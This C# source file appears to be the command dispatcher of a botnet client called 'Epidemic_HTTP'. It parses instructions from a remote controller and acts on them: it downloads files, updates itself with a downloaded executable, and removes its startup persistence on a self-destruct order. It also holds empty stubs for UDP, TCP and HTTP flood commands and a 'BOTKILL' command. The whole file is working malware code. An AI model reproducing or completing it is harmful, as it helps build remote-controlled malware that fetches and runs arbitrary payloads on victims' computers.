using System;
using System.Threading;

namespace Epidemic_HTTP;

internal class Commands
{
	private static string[] commands = null;

	public Commands(string[] ucommands)
	{
		commands = ucommands;
	}

	public void ProcessCommands()
	{
		try
		{
			for (int i = 0; i < commands.Length; i++)
			{
				string text = null;
				string flags = null;
				string text2 = null;
				string[] args = null;
				try
				{
					text = Functions.GetStringInBetween("COMMAND=", "<br />", commands[i], includeBegin: false, includeEnd: false)[0];
					args = Functions.GetStringInBetween("ARGS=", "<br />", commands[i], includeBegin: false, includeEnd: false)[0].Split(new char[1] { ' ' });
					flags = Functions.GetStringInBetween("FLAGS=", "<br />", commands[i], includeBegin: false, includeEnd: false)[0];
					text2 = commands[i].Substring(commands[i].IndexOf("VERSION=") + 8);
					Console.WriteLine(">" + text2 + "<  ---- " + commands[i]);
				}
				catch
				{
				}
				double version = 0.0;
				if (text2.Length > 0)
				{
					version = Convert.ToDouble(text2);
				}
				if (text != null)
				{
					DoCommand(text, args, flags, version);
				}
			}
		}
		catch (Exception ex)
		{
			Functions.ReportError(Functions.GetMethodName("{0}"), ex.Message, ex.StackTrace);
		}
	}

	private void DoCommand(string command, string[] args, string flags, double version)
	{
		try
		{
			if (!(Config.bot_version >= version) && !(command == "UPDATE"))
			{
				return;
			}
			switch (command)
			{
			case "DOWNLOAD":
				if (!Config.debug)
				{
					Download object3 = new Download(args[0], args[1], f_update: false);
					Thread thread3 = new Thread(object3.DownloadFile);
					thread3.Start();
				}
				break;
			case "UPDATE":
				Console.WriteLine("k got update command........ is " + version + " gr8r dan " + Config.bot_version + "?");
				if (version > Config.bot_version && !Config.debug)
				{
					Console.WriteLine(version + " must b gr8r den my version " + Config.bot_version);
					Console.WriteLine("aight gonna upd8 with exe " + args[0] + " as a uhhh " + args[1]);
					Download object2 = new Download(args[0], args[1], f_update: true);
					Thread thread2 = new Thread(object2.DownloadFile);
					thread2.Start();
				}
				break;
			case "SELFDESTRUCT":
			{
				Startup @object = new Startup();
				Thread thread = new Thread(@object.RemoveStartup);
				thread.Start();
				break;
			}
			case "DUMPRSBOT":
			case "BOTKILL":
			case "UDP":
			case "TCP":
			case "HTTP":
			case "VISIT":
				break;
			}
		}
		catch (Exception ex)
		{
			Functions.ReportError(Functions.GetMethodName("{0}"), ex.Message, ex.StackTrace);
		}
	}
}
